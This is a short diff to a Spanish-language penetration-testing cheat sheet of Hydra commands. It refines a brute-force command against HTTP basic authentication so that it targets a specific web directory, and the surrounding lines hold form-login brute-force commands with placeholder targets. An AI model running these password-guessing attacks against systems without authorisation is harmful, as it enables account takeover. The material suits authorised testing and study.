@@ -48,9 +48,9 @@ hydra -l none -P <PATH-TO-PASSWORD.lst> -f <IP-ADDRESS> https-post-form "/db/ind
 hydra -l admin -P <PATH-TO-PASSWORD.lst> -f <IP-ADDRESS> -s <PORT> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 ```
 
-#### Ataque de Fuerza Bruta a una Authenticacion Basica
+#### Ataque de Fuerza Bruta a una Authenticacion Basica que se encuentre en un directorio web
 ```
-hydra -l admin -P <PATH-TO-PASSWORD.lst> -s <PORT> -f <IP-ADDRESS> http-get
+hydra -l admin -P <PATH-TO-PASSWORD.lst> -s <PORT> -f <IP-ADDRESS> http-get /<DIRECTORY>
 ```
 
 #### Cracking con Brute Force en WEB Login Server, enviando 'usuario:password'
